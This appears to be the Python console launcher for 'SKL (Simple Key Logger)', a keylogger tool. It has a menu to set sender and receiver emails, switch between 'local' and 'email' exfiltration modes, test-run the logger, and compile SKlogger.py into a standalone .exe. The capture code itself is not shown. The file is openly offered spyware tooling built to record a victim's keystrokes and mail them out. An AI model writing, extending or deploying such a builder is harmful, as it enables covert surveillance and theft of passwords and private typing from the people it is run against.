from KeyLogger.config import newConfig, bcolors, commands_list
import os
import requests

os.system("cls")







def printlogo():
    print(bcolors.FAIL+ """
    ░██████╗██╗░░██╗██╗░░░░░
    ██╔════╝██║░██╔╝██║░░░░░
    ╚█████╗░█████═╝░██║░░░░░
    ░╚═══██╗██╔═██╗░██║░░░░░
    ██████╔╝██║░╚██╗███████╗
    ╚═════╝░╚═╝░░╚═╝╚══════
        """)





# def license():
#     # The list with all keys.
#     keys = requests.get("http://yourlink.com/licensekeys.txt").text
#     # keys = ["key1", "key2", "key3"]

#     # License key from user.
#     keyfromuser = input("License Key: ")

#     for key in keys.splitlines():
#         if key == keyfromuser:
#             # Code when key match.
#             return

#     # Code if the key don't match.
#     exit()

# license()


print("....Welcome to SKL....\nType \"help\" for a list of commands")

def __main__():
    print( bcolors.RESET_DIM +bcolors.WARNING + "SKL (Simple Key Logger)")
    CONSOLE = input(bcolors.WARNING + "Command: " + bcolors.WHITE)
    os.system("cls")
    printlogo()
    return_c = 1

    if CONSOLE.lower() not in commands_list:
        print(bcolors.DIM + bcolors.FAIL + f"INVAILD COMMAND || USER ERROR \n{CONSOLE} was not found....")
        print(bcolors.RESET_DIM + "type \"help\" for avaliable commands. \n\n")
        


    if CONSOLE.lower() == "help":
        os.system("cls")
        printlogo()
        print(bcolors.OKCYAN + "Here's a list of avaliable commands:" + "\n" + bcolors.FAIL + "(config) " + bcolors.DIM + "Change Sender & Receiver Emails" + "\n" +
               bcolors.RESET_DIM + "(compile) " + bcolors.DIM + "Compiles the project into a .exe to be used." + bcolors.RESET_DIM + 
               "\n(exit) " + bcolors.DIM + "Close the SKL Program" +
                 bcolors.RESET_DIM + "\n(emails) " + bcolors.DIM + "Shows your current saved config." + bcolors.RESET_DIM
                 + "\n(test)" + bcolors.DIM + " tests the keylogger and outputs it to the \"out\" folder & to your email" +bcolors.RESET_DIM + "\n(Mode)" +
                 bcolors.DIM + " choose between 'local' or 'email' mode." + bcolors.RESET_DIM)
        

    elif CONSOLE.lower() == "config":
        os.system("cls")
        printlogo()
        print(newConfig.edit_data())

    elif CONSOLE.lower() == "emails":
        os.system("cls")
        printlogo()
        print(bcolors.DIM + "Here's your current saved data.")
        print(bcolors.WHITE + bcolors.RESET_DIM)
        print(newConfig.print_data())

    elif CONSOLE.lower() == "exit": 
        os.system("cls")
        printlogo()
        print(bcolors.FAIL + "Exiting SKL...")
        return_c = 0

    elif CONSOLE.lower() == "compile":
        try:
          
           os.system("pyinstaller --onefile SKlogger.py")
        except:
            print(bcolors.FAIL + "Failed to compile KeyLogger.\n Please make sure SKlogger.py is in the directory of this file.")


    elif CONSOLE.lower() == "test":
        print(bcolors.WARNING + "Starting Key Logger.\n")
        try:
         
            os.system("py SKlogger.py")
        except:
            print(bcolors.FAIL + "Failed to load KeyLogger.\n Please make sure SKlogger.py is in the directory of this file.")

        print(bcolors.FAIL + "You will have to close this program to restart it.")

    elif CONSOLE.lower() == "mode":
        os.system("cls")
        printlogo()
        print(newConfig.mode())



    
        
    if return_c == 1:
        bcolors.WHITE
        __main__()

printlogo()
__main__()

print(bcolors.WHITE)